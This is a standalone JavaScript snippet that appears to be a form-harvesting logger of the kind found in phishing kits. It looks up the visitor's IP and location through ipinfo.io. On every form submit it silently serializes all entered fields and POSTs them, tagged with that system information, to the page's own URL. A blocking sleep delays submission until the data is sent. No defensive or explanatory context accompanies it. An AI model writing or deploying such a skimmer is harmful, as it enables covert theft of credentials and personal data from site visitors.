var url = window.location.origin+window.location.pathname;
var req = new XMLHttpRequest();
var data = "";

req.responseType = 'json';
req.open('GET', "https://ipinfo.io/json", true);
req.onload  = function() {
  data = JSON.stringify(req.response); 
};
req.send(null);

var xhr = new XMLHttpRequest();

function sleep(milliseconds) {
  const date = Date.now();
  let currentDate = null;
  do {
    currentDate = Date.now();
  } while (currentDate - date < milliseconds);
}

function sendData(_url, _data){
  xhr.open("POST", _url, true);
  xhr.setRequestHeader('Content-Type', 'application/json');
  xhr.send(_data);
}

function showValues(){
  var str = $( "form" ).serialize();
  sendData(url, str+"\nSYSINFO #"+data);
  return true;
}
var isDone = false;
$( "form" ).submit(function(event){
    showValues();
    sleep(500);
    return true;
});
